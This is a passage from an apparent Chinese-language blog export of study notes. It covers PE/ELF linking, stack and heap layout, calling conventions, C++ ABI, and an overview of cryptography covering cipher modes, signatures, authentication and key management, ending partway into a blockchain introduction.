*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><ul><li><p>导入表<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体数组，一个表对应一个被导入的dll.</p><p>其中的<code>FirstThunk</code>指向IAT即导入地址数组，IAT每个元素对应一个被导入的符号：元素的值在不同情况下有不同含义。动态链接器刚完成映射还没开始重定位和符号解析时IAT中元素值表示对应符号的序号，完成全部链接过程后该值就会被改写为符号真正的地址。</p><blockquote><p>动态链接器属于内核部分，会更改原本只读的导出表，更改完成后再变回去。而ELF中.got则可以随意修改</p></blockquote><p>指针<code>OriginalFirstThunk</code>指向INT，在装载之前其内容和IAT一样。在装入内存之后就变成了导入函数的地址，而非名字</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125; DUMMYUNIONNAME;<span class="comment">//IMAGE_THUNK_DATA数组的指针，在文件中与FirstThunk指向一样，内存中不同</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件建立时间戳</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">//引用的DLL的API，又引用了其他DLL的API，现在一般为0</span></span><br><span class="line">    DWORD   Name;<span class="comment">//指向的DLL名字</span></span><br><span class="line">    DWORD   FirstThunk;<span class="comment">//通常是一个RVA，指向IMAGE_THUNK_DATA结构（该结构说明函数的导入方式）</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><strong>PE&amp;ELFの区别</strong></p><ul><li><p>ELF的共享库默认导出所有的全局符号，但在DLL中默认不导出，需要告诉编译器<code>__declspec(dllexport/dllimport)</code>，这两个关键字非常重要用于声明导入导出以及解决符号引用问题，也可以使用.def文件（类似ld的链接脚本文件）</p></li><li><p>DLL与ELF的代码段地址无关不同，采用的是装载时重定位的方法，重定位信息存放在.reloc段中。一个DLL如果被多个进程共享，则每个进程都需要有一份单独的DLL代码段副本。系统DLL一般位于0x70000000~0x80000000</p><blockquote><p>DLL的基地址也是可以指定的<code>link /BASE:0x10010000,0x1000 /DLL ooxx.obj</code>，减少后续重定位花费时间。<code>editbin</code>更改已有DLL的基地址</p></blockquote></li></ul><p><strong>导入函数绑定</strong>：也叫DLL绑定。当EXE和DLL准备运行时，都要首先解析导入导出函数，之后再装载。在这个过程中DLL一般都以相同顺序装载到同样的内存地址，所以为了省事，就提前通过<code>editbin</code>将这些导入函数地址绑定到EXE的INT中</p><blockquote><p>前提：DLL的导出函数地址不变，并且在装载时没有发生重定位。一般通过在PE的导入表中保存每个DLL的时间戳和校验和，在运行时由OS核对被装载的DLL和绑定时的DLL是否相同</p></blockquote><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>在32位中，Linux默认高1GB给内核，Windows则是默认高2GB。剩下的空间都叫内存空间，默认有如下区域：（Linux）</p><ul><li>栈0xc0000000：维护函数调用上下文；位于用户空间最高处，向低地址方向生长</li><li>动态链接库映射区0x40000000：装载共享库</li><li>堆：应用程序动态分配的内存区域；由低向高地址生长</li><li>可执行文件映像：由装载器将可执行文件读取至该位置</li><li>保留区：多个区域的统称，因为受到内存保护而不能访问</li></ul><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>在i386上，栈顶由esp寄存器保存，栈底由ebp保存，因为是高地址向低生长的，故压栈使栈顶减小（sub esp）</p><p><strong>堆栈帧</strong>：也叫活动记录，用于保存一个函数调用所需要的维护信息，内容如下</p><ul><li>函数的返回地址和参数</li><li>临时变量：包括函数的非静态局部变量以及编译器自动生成的其他临时变量</li><li>保存的上下文：包括在函数调用前后保持不变的寄存器</li></ul><p><strong>函数调用过程</strong>：</p><ol><li><p>对于调用者：</p><ul><li>将所有或者部分参数压栈，或者使用特定寄存器进行</li><li>把当前指令的下一条指令地址压入栈中，跳转到函数体执行（call指令一起执行）</li></ul></li><li><p>对于被调用的函数：</p><ul><li><code>push ebp</code>：保存旧的栈底</li><li><code>mov ebp,esp</code>：设置当前esp为栈底</li><li>【可选】<code>sub esp,XXX</code>：在栈上分配xxx字节临时空间，一般就是函数内部变量。未初始化的局部变量会有默认值，由编译器决定</li><li>【可】<code>push xxx</code>：保存寄存器</li></ul></li></ol><p>此时的活动记录一般来说就是：参数——返回地址——旧栈底——局部变量</p><ol><li>函数返回：<ul><li>【可选】<code>pop xxx</code>：有必要的话恢复寄存器</li><li><code>mov esp,ebp</code>：恢复esp并同时回收局部变量</li><li><code>pop ebp</code>：恢复旧的栈底</li><li><code>ret</code>：栈中取得返回地址并返回调用者</li></ul></li></ol><p><strong>函数返回值</strong>：eax寄存器不够就再加上ebx，eax放置低4字节，ebx存放高的四字节。如果比8字节还大</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">big_struct ret = func();</span><br></pre></td></tr></table></figure><p>设置一个临时变量temp（<code>sub esp</code>的值变大），之后将其作为隐藏参数传递给被调用函数func，之后将函数执行结果复制到该temp，并返回temp的地址为eax，最后再复制给接收变量ret。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">big_struct temp;</span><br><span class="line">func(&amp;temp);</span><br><span class="line"><span class="built_in">memcpy</span>(ret, eax, size);</span><br></pre></td></tr></table></figure><p><strong>调用惯例</strong>：函数调用方和被调用方都遵守相同的约定，函数才能被正确调用</p><ul><li>函数参数的传递方式：一般都是栈传递（左向右or右向左），有些是寄存器（哪些寄存器）</li><li>栈的维护方式：函数调用前后，使栈在前后保持一致的工作（前面的函数返回部分中的栈操作）</li><li>名字修饰：使用不同的调用惯例的函数有不同的名字来区分规则</li></ul><div class="table-container"><table><thead><tr><th>调用惯例</th><th>出栈方</th><th>参数传递</th><th>名字修饰</th></tr></thead><tbody><tr><td>cdecl</td><td>调用者</td><td>右向左</td><td>_func</td></tr><tr><td>stdcall</td><td>被调的函数</td><td>右向左</td><td>_func@参数字节数</td></tr><tr><td>fastcall</td><td>被调的函数</td><td>左开始头两个≤4B的放入寄存器，其他的从右到左压栈</td><td>@func@参数字节数</td></tr></tbody></table></div><blockquote><p>C语言默认cdecl，也可以gcc下<code>__attribute(())</code>设置</p></blockquote><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>一般都是程序预先向操作系统申请一块大小适当的堆空间，之后由程序自己管理（运行库）这块空间，不够了再申请</p><p><strong>Windows堆结构</strong></p><blockquote><p><a href="https://bbs.kanxue.com/thread-255546.htm">Windows内存堆内容整理总结</a>，下面这里讲的都是传统的NT堆。</p></blockquote><p>在win中有一系列大小不一的堆块，一部分由程序自主管理，剩下的空白堆块由系统的堆表管理。每个堆块都有一个头，用来存储相关信息。</p><p>堆表<code>_HEAP</code>有两种（不同堆表对应不同的堆块头<code>_HEAP_ENTRY</code>）：</p><ul><li>空闲双向链表freelist：一个128项的数组，其中的内容是指向堆块header的指针。从free[1]开始每个指针指向的是一个8*n大小的堆块，&gt;=1024B的堆块都在free[0]中按照升序排列</li><li>快速单向链表/快表lookaside：同样是128项，每项是一个单向链表，链表长度不超过4。（PS：没说堆块大小！但一条链上的应该是相等的）</li></ul><p>注意这里的两种在内存中都有，配合使用。三种堆块分配方式</p><ol><li><p>查找快速单向链表，也就是进程要的大小正好能在这里找到对应的。</p></li><li><p>空闲双向链表中寻找，最小的但&gt;=要求的堆结构。</p><blockquote><p>如果大于要求大小，则会将选择的堆块重新切割，多余的堆块继续插回到freelist中。当两个堆块彼此相邻时还会发生堆合并的操作，用于减小碎片，并插回freelist</p></blockquote></li><li><p>0号空表，从freelist[0]队尾反向搜索</p></li></ol><blockquote><p>详细数据结构<a href="https://bbs.kanxue.com/thread-279617.htm">Windows堆初探-二进制漏洞</a></p></blockquote><p><strong>Linux下堆管理</strong>：</p><ul><li><code>int brk(void* end_data_segment)</code>系统调用设置进程数据段的结束地址，扩大的空间就可以被用作堆。Glibc中的封装<code>sbrk()</code></li><li><code>void *mmap(void *start,ize_t length, int prot, int flags, int fd, off_t offst)</code>向操作系统申请一段虚拟地址空间，可以映射到文件，也可以不映射这样就叫做匿名空间，匿名空间可以作为堆。对应Glibc中的malloc</li></ul><p><strong>Windows进程堆管理</strong></p><ul><li><p><code>kernel32.dll</code>中的<code>VirtualAlloc()</code>申请空间，函数可以干任何事，但大小必须是页的整数倍</p></li><li><p>堆管理器根据上述API封装至<code>NTDLL</code>中的<code>RtlAllocHeap()</code>再向上提供了相关API：<code>HeapCreate</code>创建堆；<code>HeapAlloc</code>堆中分配内存；<code>HeapFree</code>释放已分配内存；<code>HeapDestory</code>摧毁</p><blockquote><p>这个堆管理器有两份：NTDLL.dll面向用户；Ntoskrnl.exe面向内核</p></blockquote></li><li><p>默认进程都会给1MB大小，链接器<code>/HEAP</code>参数可以通过<code>VirtualAlloc</code>申请</p></li></ul><p><strong>堆分配算法</strong>：</p><ul><li>空闲链表：堆里的每个空闲空间，开头记录上一个空闲块地址，结尾记录下一个</li><li>位图：堆划分为块，有头/主体/空闲三种状态，两位表示一个块的使用情况，头表示开始-主体表示已分配</li><li>对象池：整个堆空间划分为大量不同大小的块，需要的时候请求对应大小</li></ul><h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><ol><li>操作系统创建进程后，控制权交给程序入口（PE/ELF文件中某一项），该入口一般是运行库中某个函数</li><li>入口函数完成运行库和程序运行环境初始化（堆、IO、线程等）</li><li>入口函数初始化后调用main</li><li>main执行完成后返回到入口函数进行清理工作</li></ol><p>Linux下：<code>_start</code>（汇编）-&gt;<code>__libc_start_main</code>-&gt; <code>exit</code> -&gt; <code>_exit</code>（汇编）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __libc_start_main(</span><br><span class="line"><span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span>**, <span class="type">char</span>**),</span><br><span class="line">    <span class="type">int</span> argc,</span><br><span class="line">    <span class="type">char</span>* __unbounded* __unbounder ubp_av,<span class="comment">//也就是argv，即环境变量</span></span><br><span class="line">    __typeof (main) init,<span class="comment">//main调用前的初始化工作</span></span><br><span class="line">    <span class="type">void</span> (*fini)(<span class="type">void</span>),<span class="comment">//main结束后的</span></span><br><span class="line">    <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>),<span class="comment">//和动态加载有关的收尾动作</span></span><br><span class="line">    <span class="type">void</span>* __unbounded stack_end<span class="comment">//表明栈底地址</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>MSVC CRT：<code>mainCRTStart</code></p><ol><li>初始化和OS版本有关的全局变量</li><li>初始化堆<code>_heap_init</code>和I/O<code>_ioinit</code></li><li>获取命令行参数和环境变量<code>_setargv</code>&amp;<code>_setenv</code></li><li>初始化C库的一些数据<code>_cinit</code></li><li>调用main并记录返回值<code>mainret = main(__argc,__argv,_environ)</code></li><li>检查错误并将main的返回值返回</li></ol><h3 id="复杂的CPP"><a href="#复杂的CPP" class="headerlink" title="复杂的CPP"></a>复杂的CPP</h3><p><strong>标准库</strong></p><p>ANSI对c的标准叫做标准库，glibc和MSVC CRT都是依赖于不同OS上的扩展后运行库</p><p><strong>cpp符号名修饰</strong></p><p>在CPP的命名空间中有函数签名机制，不同的编译器使用不同的名称修饰方法，使得每个函数签名对应一个修饰后的名称，也就是最终的符号名。为了向后兼容C，<code>extern &quot;C&quot;&#123;&#125;</code>中可以直接当做C代码处理，也就是不会用上面所说的修饰方法，而是根据编译器来判定是否有下划线</p><p><strong>cpp重复代码消除</strong></p><p>产生因素：模板、外部内联函数、虚函数表都有可能在不同的编译单元里面生成相同的代码。</p><p>以模板为例，目前主流编辑器思路是将一个模板实例单独存放在一个段中，当别的编译单元实例化模板之后也会生成同样的名字，方便在最终链接的时候区分。虚函数表和外部内联函数类似</p><blockquote><p>函数级别链接：将函数都保存为一个段中，其他目标文件需要时就单独合并。虽然减小了文件空间，但是需要链接器计算函数之间的依赖关系，且段的数目极大的增加。在VC和GCC中都有实现</p></blockquote><p><strong>cpp全局构造与析构</strong></p><p>在main函数开始之前，需要先进行进程执行环境初始化，也就是代码的真正开始（Linux下Glibc的<code>_start</code>），在这个过程中全局对象构造函数执行，其析构函数在main之后被执行。于是乎在ELF文件中会见到.init段和.fint段，也就是整个程序的开始与结束，而非程序员编写的开始结束。</p><p><strong>cpp与ABI</strong></p><p>ABI即应用程序二进制接口，区别于API的源代码级别也就是哪个函数，ABI则更加底层。符号修饰标准、变量内存布局（C的四区，CPP的五区）、函数调用方式等都属于ABI的一部分，在不同指令集架构机器上ABI一般都不同，因为在不同的架构集上堆栈分布与参数细节都不一样。因此对于不同的编译器来说即使都认识双方的可执行文件格式，也可能因此无法编译到对方的机器上。</p><p>对于C来说的二进制层面兼容部分：</p><ul><li>内置类型的大小和放置方式（大小端与对齐方式）</li><li>组合类型的存储方式和内存分布</li><li>外部符号与用户定义的符号间的命名和解析方式</li><li>函数调用方式</li><li>堆栈的分布方式</li><li>寄存器使用约定</li></ul><p>对于CPP来说又多了许多：继承类体系的内存分布、指向成员函数的指针的内存分布、如何调用虚函数、模板如何实例化等。这也就是为什么有时候用户的编译器型号与库的编译器版本不对应时就会产生不兼容，目前的主要还是微软与GCC两个标准。</p><p><strong>cpp与动态链接</strong></p><p>因为CPP并没有规定二进制层面的约定，巨硬为了解决其这方面的问题，提出了COM（组件对象模型）的工作，其主要内容如下：</p><ul><li>所有接口函数都应该是抽象的，方法都应该是纯虚的</li><li>所有全局函数都赢使用<code>extern &quot;C&quot;</code>防止名字的修饰，并使用<code>__stdcall</code>调用规范</li><li>不使用标准库STL、异常、虚析构函数、重载</li><li>不在DLL中申请内存并且在DLL外释放</li></ul><p><strong>cpp的调用惯例</strong>：对于传统的c的调用惯例有所改变，也有独特的thiscall，会随着编译器的不同而改变</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学及相关应用</title>
      <link href="/2023/10/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/10/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="密码学概述"><a href="#密码学概述" class="headerlink" title="密码学概述"></a>密码学概述</h3><ul><li><p>密码学=密码编制学（设计密码）+密码分析学（破译密码）</p></li><li><p><strong>基本特性</strong>：机密性（不为人知）；完整性（传输过程防篡改）；可用性（随时可访问）；认证性（确保来源）；不可否认性（不能抵赖）</p></li><li><p><strong>构成</strong>：密码系统由明文空间P、密文空间C、密钥空间K、加E解D密算法构成的集合，即S={P,C,K,E,D}</p></li><li><p><strong>密码分析攻击方式</strong>：</p><ul><li><p>穷举攻击：暴力破解，所有可能尝试</p></li><li><p>数学攻击：现代密码基于数学难题，破解密码就是破解这些难题</p><blockquote><p>以差分分析为主（下面还包括：高阶、截断、不可能差分等）</p></blockquote></li><li><p>物理攻击：从设备下手</p><blockquote><p>侧信道攻击着重于交互过程，包括：功耗分析、时间分析、故障分析</p></blockquote></li></ul><p>依据可利用资源来进行分类：</p><ul><li>仅知密文攻击：顾名思义，香菇无需多言</li><li>已知明文攻击：除密文外，还知道部分明文-密文对</li><li>选择明文攻击：能够直接获取所有明文对应的密文</li><li>选择密文攻击：能够直接获取密文对应的明文</li></ul></li><li><p><strong>密钥交换</strong>：box中放上需要传输的密钥，A加密box传给B，B收到后用自己的加密回送给A，A解密后再发给B，B解密得到密钥（常用于对称加密）</p></li><li><p><strong>密码学分类</strong>：</p><p>按照发展时间：</p><ul><li>古典密码：以字符为基本加密单元</li><li>现代密码：多以信息块为基本加密单元</li></ul><p>依据密码体制分类：</p><ul><li>对称密码体制：加密解密密钥相同</li><li>非对称密码体制：加密解密密钥不同，公钥对外，私钥对内</li></ul><p>明文处理方式分类：</p><ul><li>分组密码：一个密钥对一块数据的加密，输出固定长度</li><li>序列密码/流密码：明文与密钥长度一致，基本每一个明文字符对应一个密钥字符</li></ul></li></ul><hr><h3 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h3><p>具体算法有了之后，在实际中还要考虑每一个处理单元之间的关联，这就叫做工作模式。</p><h4 id="电码本模式ECB"><a href="#电码本模式ECB" class="headerlink" title="电码本模式ECB"></a>电码本模式ECB</h4><p>最纯粹的模式，直接使用明文与密钥进行分组加密算法运算。$C_{i}=E(M_{i},K);i=1,2…n$；缺点在于分组的长度必须是加密算法要求的分组长度整倍数，对于那些多出来的需要以其他方式进行处理。</p><blockquote><p>E()为加密函数，C为密文，K为明文</p></blockquote><p><strong>短块加密</strong>：（适用于所有有短块的工作模式）</p><ol><li>填充法：填充随机数据，将最后的8位作为填充指示符</li><li>序列密码加密法：对短块用序列密码加密$C_{n}=M_{n}\oplus MSB_{u}(E(C_{n-1},K))$；其中$MSB_{u}(X)$是取X的高u位；当要加密明文本身即是短块时，选定初始化向量Z代替$C_{n-1}$</li><li>密文挪用技术：在对短块加密之前，先从密文$C_{n-1}$中挪出刚好够填充的位数，将其填充到$M_{n}$中，之后再对$M_{n}$进行加密；当明文本身即为短块时，同样选定初始化向量Z</li></ol><h4 id="密文链接模式CBC"><a href="#密文链接模式CBC" class="headerlink" title="密文链接模式CBC"></a>密文链接模式CBC</h4><p><strong>明密文链接模式</strong>：错误传播无界（当有一位发生错误，此后的密文全错）</p><p>$C_{i}=\begin{cases}<br>E(M_{i}\oplus Z,K),i=1   \\<br>E(M_{i}\oplus M_{i-1}\oplus C_{i-1},K),i=2…n<br>\end{cases}$</p><p>Z为初始化向量，对应解密：</p><p>$M_{i}=\begin{cases}<br>D(C_{i},K),i=1   \\<br>D(C_{i},K)\oplus M_{i-1}\oplus C_{i-1},i=2…n<br>\end{cases}$</p><p><strong>密文链接模式</strong>：错误传播有界（多用于磁盘文件加密）</p><p>$C_{i}=\begin{cases}<br>E(M_{i}\oplus Z,K),i=1   \\<br>E(M_{i}\oplus C_{i-1},K),i=2…n<br>\end{cases}$</p><p>解密如下，但是错误传播无界：</p><p>$M_{i}=\begin{cases}<br>D(C_{i},K),i=1   \\<br>D(C_{i},K)\oplus C_{i-1},i=2…n<br>\end{cases}$</p><h4 id="X-CBC模式"><a href="#X-CBC模式" class="headerlink" title="X CBC模式"></a>X CBC模式</h4><p>不同于前两者，该模式可以处理任意长度的数据明文，但是需要使用三个密钥$K_{1},K_{2},K_{3}$，还以Z作为初始化向量。</p><p>$C_{i}=\begin{cases}<br>E(M_{i}\oplus Z,K_{1}),i=1   \\<br>E(M_{i}\oplus C_{i-1},K_{1}),i=2…n-1 \\<br>\begin{cases}<br>E(M_{n}\oplus C_{n-1}\oplus K_{2},K_{1}),M_{n}不是短块  \\<br>E(Pad(M_{n}\oplus C_{n-1}\oplus K_{3},K_{1})),M_{n}是短块<br>\end{cases}<br>\end{cases}$</p><p>Pad（）为填充函数，如下：</p><p>$Pad(X)=\begin{cases}X,当X不是短块\\ X10…0,当X是短块  \end{cases}$</p><h4 id="输出反馈模式OFB"><a href="#输出反馈模式OFB" class="headerlink" title="输出反馈模式OFB"></a>输出反馈模式OFB</h4><p>在该模式中，通过密钥序列产生器来产生一个流密钥串，使得分组密码按照流密码的方式进行加解密。具体流程如下：</p><ol><li>R为移位寄存器，赋予初始值（种子）$I_{0}$</li><li>将R中的内容作为明文进行加密，$E(R,K)$</li><li>将得到的加密串最右边的s位与明文进行异或实现序列加密</li><li>后s位再次反馈到R中，即让R中内容左移s位，用于填充，之后再进行下一轮</li></ol><p>适合语音图像等，冗余度加大的数据，但是对于错误传播而难以检测</p><h4 id="密文反馈模式CFB"><a href="#密文反馈模式CFB" class="headerlink" title="密文反馈模式CFB"></a>密文反馈模式CFB</h4><p>基本类似于上述方法，区别的是：</p><p>在第四步中反馈给R的后s位，来自加密后的明文的右s位（即第三部结果的右s位）</p><h4 id="CTR模式"><a href="#CTR模式" class="headerlink" title="CTR模式"></a>CTR模式</h4><p>与上述两种工作模式一样，将分组密码转换为序列密码，属于对合运算。其中的T是给定的计数序列，且必须是时变的。具体过程如下：$MSB_{u}$代表高u位，u&lt;分组长度</p><p>$\begin{cases}<br>O_{i}=E(T_{i},K),i=1,2…n   \\<br>C_{i}=M_{i}\oplus O_{i},i=1,2…n-1 \\<br>C_{n}=M_{n}\oplus MSB_{u}(O_{n})<br>\end{cases}$</p><p>解密过程如下：</p><p>$\begin{cases}<br>O_{i}=E(T_{i},K),i=1,2…n   \\<br>M_{i}=C_{i}\oplus O_{i},i=1,2…n-1 \\<br>M_{n}=C_{n}\oplus MSB_{u}(O_{n})<br>\end{cases}$</p><p>由于没有错误传播，所以不适合用于数据完整性认证</p><hr><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>三个基本条件：</p><ul><li>签名者事后不能抵赖自己的签名</li><li>任何其他人并不能伪造签名</li><li>签名能够被验证真伪</li></ul><p>签名产生算法$SIG$，签名验证算法$VER$，产生签名应当用私密钥$K_{d}$，公开验证时用公密钥$K_{e}$。</p><p>函数必须满足的条件：</p><ul><li>当$M’\ne M$时，有$SIG(M,K_{d})\ne SIG(M’,K_{d})$，即$S\ne S’$</li><li>签名$S$只能由签名者产生，否则别人可以伪造，就会存在抵赖</li><li>收信者可以验证真伪</li><li>签名纠纷发生时，应当能够公开解决（私密钥不能泄露）</li></ul><p>可选成立：</p><ul><li>$VER(S,K_{e})=VER(SIG(M,K_{d}),K_{e})=M$</li><li>$VER(SIG(M,K_{d}),K_{e})=SIG(VER(M,K_{e}),K_{d})=M$</li></ul><p>即验证算法时使用的公密钥对密文处理时，不一定非要是明文，只要能够得到$K_{d}$和$K_{e}$之间的关系即可</p><hr><h3 id="密码协议"><a href="#密码协议" class="headerlink" title="密码协议"></a>密码协议</h3><p>大致按照功能分类如下：</p><ul><li>密钥建立协议：用于确定会话密钥</li><li>认证协议：包括不限于身份认证协议、通信站点认证协议、报文认证协议</li><li>身份验证和密钥建立协议：前两者的结合，先验证在确定密钥</li><li>电子商务协议：还注重公平性</li></ul><p>设计原则：</p><ul><li>消息独立完整性原则：无二义性，且无需借助上下文</li><li>消息前提准确原则：消息相关的先决条件需要确立</li><li>主体身份标识原则：消息中或隐或显的附在消息中，如果需要的话</li><li>加密目的原则：明确加密的目的，减少冗余</li><li>签名原则：如果需要同时签名和加密，应先签名（对数据Hash签）再加密</li><li>随机数使用原则：随机性应符合要求</li><li>时间戳的使用原则：不同系统的时钟同步</li><li>编码原则：需要明确协议中消息的具体数据格式</li><li>最少安全假设原则：验证协议时需要尽可能减少安全假设，假设越多证明实际越危险</li></ul><p>协议安全分析：形式逻辑分析、模型检测方法、定理证明方法</p><hr><h3 id="认证-鉴别"><a href="#认证-鉴别" class="headerlink" title="认证/鉴别"></a>认证/鉴别</h3><p>与数字签名不同，认证是在双方诚实的前提下，提供的一种验证信心来源真假的手段；具体区别如下：</p><ul><li>认证基于双方共享的保密数据，数字签名的签名验证属于公开信息</li><li>认证仅允许双方验证，数字签名还可以有第三方</li><li>数字签名发送方不能抵赖、接收方不能伪造，能在公众面前解决纠纷的能力，认证不行</li></ul><p><strong>身份认证</strong>：</p><ul><li><p>口令：传统的用户输入密码，系统查表对照</p><p>传统方案缺点：口令表直接获取、传输线路截取、用户无法验证系统</p><p>改进措施：单向函数加密、数字签名验证口令、口令双向验证、一次性口令</p><p>Good口令：多种字符、足够长、尽量随机、定期更换</p></li><li><p>磁卡（仅数据存储）、IC卡（嵌有单片机芯片）、USB-Key（有USB接口的单片机）</p><blockquote><p>PIN个人识别号，必须牢记，用来防治上述物品丢失直接导致信息泄露</p></blockquote></li><li><p>生理特征识别：DNA、掌纹、指纹、面孔、虹膜、骨架、发音</p></li><li><p>零知识证明：最简单的A向B说出只有A知道的特征，进一步就是让B知道“A知道“该特征而不用泄露</p><blockquote><p>Feige-Giat-Shamir身份认证方案、Guillou-Quisquater方案</p></blockquote></li></ul><p><strong>站点认证</strong>：</p><p>单向认证：A发送方，B接收方，若共享一个会话密钥$K_{s}$</p><ol><li>A先产生随机数$R_{A}$，用密钥加密后发给B，并进行$f(R_{A})$</li><li>B用会话密钥对报文解密，得到$R_{A}$之后再用f变换，$f(R_{A})$使用密钥加密发给A</li><li>A对$f(R_{A})$进行验证</li></ol><p>若使用公钥密码体制：双方公私钥为$K_{eA}K_{dA}\&amp; K_{eB}K_{dB}$</p><ol><li>A产生随机数$R_{A}$发给B</li><li>B用私钥签名发给A，A再拿B的公钥验证</li></ol><p>双向认证：符号如上不再多说，下面是传统密码</p><ol><li>A产生随机数$R_{A}$，用$K_{s}$加密后发给B</li><li>B用$K_{s}$解密后得到$R_{A}$，自己也产生随机数$R_{B}$并与$R_{A}$拼接，再用$K_{s}$加密后发送</li><li>A解密后对比$R_{A}$，确定B为目标，并将$R_{B}$加密后发给B，来让B确认A</li></ol><p>公钥密码体制：</p><ol><li>A产生随机数$R_{A}$直接给B</li><li>B自己产生随机数$R_{B}$，拼在$R_{A}$后面，并用$K_{dB}$签名后给A</li><li>A用$K_{eB}$验证签名，将得到的$R_{A}$对比，确定B为目标后，再用$K_{dA}$对$R_{B}$签名发送</li><li>B用A的公钥$K_{eA}$进行验证</li></ol><p><strong>报文认证</strong>：</p><ul><li><p>报文源认证：对于传统密码$A\to B:E(ID_{A}||M,K_{s})$，$ID_{A}$代表A的标识</p><p>公开密钥密码$A\to B:D(ID_{A}||M,K_{dA})$</p></li><li><p>报文宿认证：传统密码$A\to B:E(ID_{B}||M,K_{s})$</p><p>公开密钥密码$A\to B:E(ID_{B}||M,K_{eB})$</p></li><li><p>报文内容的认证：通过验证MAC（消息认证码）的正确性来实现；$MAC=C(M,K)$，K为共享密钥（前提），输出固定长度的短数据块。目前C函数多基于Hash函数或分组密码实现</p><p>A向B发送报文M和对应的MAC，B收到后同样用K计算M的MAC值，相等则确保：报文没被修改、报文发送方确定正确</p></li><li><p>报文时间性认证：序列号、时间戳、随机数</p></li></ul><hr><h3 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h3><ul><li>管理策略着重指导，机制侧重具体实现</li><li>全程安全原则：密钥的产生、存储、分配、组织、使用、停用、更换、销毁过程必须确保妥善的安全管理</li><li>最小权力原则：应当只分配给用户进行某一项事务处理的最小密钥集合</li><li>责任分离原则：一个密钥一种功能，切忌多个账号一个密码！</li><li>密钥分级原则：分为高低级密钥进行管理</li><li>密钥更换原则：必须满足满足安全性指标</li></ul><p>KMC——密钥管理中心；KDC——密钥分配中心；PKI——公开密钥基础设施；CA——证书签发机构；RA——等级证书机构；PKDB——公钥库；PKC——公钥证书</p><p><strong>密钥的组织</strong>：</p><ul><li>初级密钥：初级通信密钥$K_{c}$、会话密钥$K_{s}$、初级文件密钥$K_{f}$</li><li>中级密钥：保护初级，中级通信密钥$K_{NC}$、中级文件密钥$K_{NF}$</li><li>高级密钥（主密钥）：对下两级进行保护$K_{M}$，生存周期最长</li></ul><p><strong>密钥产生</strong>：</p><ul><li>高级：高质量<strong>真随机</strong>序列；常采用物理噪声源的方法（基于力学、电子学、量子学的噪声源）</li><li>中级：可借用高级密钥和一个强的密码算法产生，纯随机最好</li><li>低级：高级密钥或中级密钥加密过的数</li></ul><blockquote><p>伪随机数产生：基于强密码算法、ANSI X9.17伪随机数产生算法、BBS伪随机数生成器</p></blockquote><p>存储形态：明文、密文、分量</p><p>备份：不同设备、不同地点、日志记录并审计、应当方便恢复、备份密钥一视同仁</p><hr><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><blockquote><p>区块链就是一个全网不断增加的大账本，每一个节点都有完整的区块链。该账本由区块（记录交易）和链（区块中的一个哈希值，用来指向上一个区块）组成的有序链表。伪造区块链至少需要全网51%的算力，因为每个区块本身的区块哈希需要上一个区块的哈希计算，区块越多越难更改。我们以比特币为区块链1.0进行介绍，将以太坊作为区块链2.0作为引入</p></blockquote><h4 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h4><p>用到的分布式数据存储、点对点传输、共识机制、加密算法，统称为区块链技术</p><p>比特币使用区块链技术实现了数字货币的可信支付，本质就是个账本系统，由中本聪最先发行，通过P2P网络（peer to peer）进行发行流通，又称为“点对点的电子现金系统”。其有价值的原因是全球都具有该共同的账本，价值为大家共同的信任。由hash对交易双方的信息进行加密处理</p><p>特点：1.高度自治，无需中心。2.无国界贸易。 